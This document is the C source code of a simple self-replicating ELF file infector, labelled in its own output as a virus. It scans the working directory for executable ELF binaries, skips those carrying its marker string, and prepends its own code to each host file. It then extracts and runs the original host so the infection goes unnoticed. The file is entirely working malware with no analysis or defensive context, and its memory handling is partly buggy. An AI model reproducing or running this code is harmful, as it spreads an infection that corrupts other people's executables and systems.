#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#define path_cnt 1
#define hard_size 10000
#define blocksize hard_size
#define mark_len sizeof(mark)

char mark[] = "c@ff3!n3-ch@0s";
char *paths[path_cnt] = {"."};

char virus[hard_size];
char buffer[blocksize];

int main(int argc, char *argv[], char *envp[])
{
struct dirent **namelist;
struct stat stats;
int i, j, n;
char *filename,*tmp;
long readcount;
FILE *fi, *ftmp;
FILE *f = fopen(argv[0], "rb");
printf("Hello! I am a simple virus!\n");
if((f) && (fread(virus, hard_size, 1, f)) )
{
	for(i = 0; i < path_cnt; i++)
	{
		int scandir(const char *dir, struct dirent ***namelist,
		int(*select)(const struct dirent *),
		int(*compar)(const struct dirent **,
		const struct dirent **));

		n = scandir(paths[i], &namelist, 0, alphasort);

		if(n < 0) continue;
		
		for(j=0; j < n; j++)
		{
			filename = malloc(strlen(paths[i])+strlen(namelist[j]->d_name)+2);
			sprintf(filename,"%s/%s",paths[i],namelist[j]->d_name);
			if (stat(filename, &stats) < 0)
			{
				free(filename);
				free(namelist[n]);
				continue;
			}
			FILE *efile = fopen(filename, "rb");
            char ebuff[5];
			if((stats.st_mode & S_IFREG) && (stats.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH)) && (efile) && fread(ebuff, 1, 4, efile))
			{
					ebuff[(sizeof ebuff)-1] = 0;
                	if (strstr(ebuff,"ELF") == NULL)
					{
						free(filename);
                		free(namelist[n]);
						continue;
					}
					fclose(efile);		
				if((!(tmp = tempnam(".", argv[0]))) || (chmod(filename, S_IRUSR | S_IWUSR) < 0))
				{	
					if(tmp) free(tmp);
					free(filename);
					free(namelist[n]);
					continue;
				}
	
				if(rename(filename, tmp) < 0)
				{
					chmod(filename, stats.st_mode);
					free(tmp);
					free(filename);
					free(namelist[n]);
					continue;
				}			
				ftmp = fopen(tmp, "rb");
				if(ftmp)
				{
					memset(buffer, 0, blocksize);
					readcount = fread(buffer, 1, blocksize, ftmp);

					if (readcount > mark_len)
					{
						char *p;
						for(p = buffer;p < (buffer+blocksize-mark_len);p++)
						if (!strcmp(p,mark))
						{
							fclose(ftmp);
							ftmp = NULL;
							break;
						}
					}
				}

				if(!ftmp)
				{
					rename(tmp, filename);
					chmod(filename, stats.st_mode);
					free(tmp);
					free(filename);
					free(namelist[n]);
					continue;
				}
				fi = fopen(filename, "wb");
				fwrite(virus, hard_size, 1, fi);
				fwrite(buffer, 1, readcount, fi);
				while(readcount == blocksize)
				{
					readcount = fread(buffer, 1, blocksize, ftmp);
					fwrite(buffer, 1, readcount, fi);
				}
				fclose(fi);
				fclose(ftmp);
				chmod(filename,stats.st_mode);
				unlink(tmp);
				free(tmp);
    			if(remove(tmp) < 0);

			}
			free(filename);
			free(namelist[n]);
		}
		free(namelist);}}

		tmp = tempnam("NULL", argv[0]);
		fi = fopen(tmp,"wb");
		do {
			readcount = fread(buffer, 1, blocksize, f);
			fwrite(buffer, 1, readcount, fi);
		} while (readcount == blocksize);
		fclose(fi);
		fclose(f);
		chmod(tmp, S_IXUSR);
		execve(tmp, argv, envp);
		if(remove(tmp) < 0);
		return 0;
}

